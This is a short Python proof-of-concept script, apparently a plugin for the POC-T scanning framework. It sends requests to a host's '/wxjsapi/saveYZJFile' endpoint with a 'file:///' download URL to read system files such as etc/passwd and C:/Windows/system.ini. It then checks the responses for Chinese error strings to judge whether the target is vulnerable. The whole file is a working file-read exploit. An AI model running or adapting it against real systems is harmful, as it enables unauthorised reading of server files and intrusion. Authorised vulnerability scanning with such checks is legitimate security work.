#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""

"""

import requests

def poc(host):
    filename = ["etc/passwd","C:/Windows/system.ini"]
    urls = []
    for i in filename:
        uri = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///%s&fileExt=txt" % i
        url = "http://"+str(host.strip())+uri
        urls.append(url)
    evidence1 = 'filepath'
    evidence2 = '系统找不到指定的路径'
    evidence3 = '无法验证您的身份'
    data = {"Host": str(host.strip()),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7",
            "Connection": "close"
            }
    for i in urls:
        try:
            r = requests.post(i, data=data, timeout=5)
            if evidence1 in r.content or evidence2 in r.content:
                return i
            elif evidence3 in r.content:
                return False
        except Exception:
            return False

    return False
